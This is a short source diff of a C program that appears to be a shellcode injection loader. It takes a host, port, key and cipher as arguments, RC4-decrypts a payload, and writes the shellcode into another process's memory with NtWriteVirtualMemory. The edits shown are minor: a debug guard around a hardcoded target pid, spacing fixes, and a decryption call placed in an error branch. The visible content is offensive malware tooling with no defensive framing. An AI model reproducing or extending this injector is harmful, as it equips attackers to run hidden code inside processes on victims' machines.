@@ -7,7 +7,9 @@
 
 #pragma comment(lib, "Ws2_32.lib")
 
+#ifdef _DEBUG
 #define pid 13400
+#endif
 
 size_t szCalc;
 size_t szKey;
@@ -238,7 +240,7 @@ void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
 int main(int argc, char* argv[]) {
 	int PID = 0;
 	char *host;
-	char* port;
+	char *port;
 	char *LocKey;
 	char *LocCipher;
 
@@ -264,7 +266,7 @@ int main(int argc, char* argv[]) {
 		port = argv[3];
 		LocKey = argv[4];
 		LocCipher = argv[5];
-		PopulateData(host,port, LocKey, LocCipher);
+		PopulateData(host, port, LocKey, LocCipher);
 		Populate();
 	}
 
@@ -300,6 +302,7 @@ int main(int argc, char* argv[]) {
 	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)cipher.data, szCalc, 0);
 	if (ntError != STATUS_SUCCESS) {
 		error("Could not write shellcode to process memory");
+		jodRC4(&shellBuff, &Key);
 		yolo();
 	}
 	else {
